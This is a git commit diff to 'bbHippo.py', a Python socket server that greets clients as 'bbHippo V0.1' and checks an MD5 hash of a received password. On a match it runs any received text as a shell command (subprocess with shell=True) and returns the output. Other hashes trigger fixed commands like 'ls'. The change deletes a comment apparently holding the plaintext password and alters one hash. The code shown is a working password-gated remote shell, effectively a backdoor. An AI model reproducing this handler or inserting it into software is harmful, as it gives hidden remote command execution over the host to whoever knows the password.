dd7efcbfcc640bc7117418db8dd5fb2245d3399b
h1tb1t <h1tb1t@users.noreply.github.com>
2021-01-21 21:44:59 +0000

    Update bbHippo.py

--- bbHippo.py
+++ bbHippo.py
@@ -11,12 +11,11 @@ def handler(clientsock,addr):
     clientsock.send("Welcome to bbHippo V0.1\n".encode())
     data = clientsock.recv(32)
     md5 = hashlib.md5(data).hexdigest()
-    #79bGbdr4
     if md5 == "29c004607ccb0739175a46fe371978a1":
         data = clientsock.recv(1024)
         output = subprocess.check_output(data.decode(), shell=True, universal_newlines=True)
         clientsock.send(output.encode())
-    if md5 == "b026324c6904b2a9cb4b88d6d61c81d2":
+    if md5 == "b026324c6904b2a9cb4b88d6d61c81d1":
         output = subprocess.check_output("ls", shell=True, universal_newlines=True)
         clientsock.send(output.encode())
     if md5 == "286755fad04869ca523320acce0dc6a4":
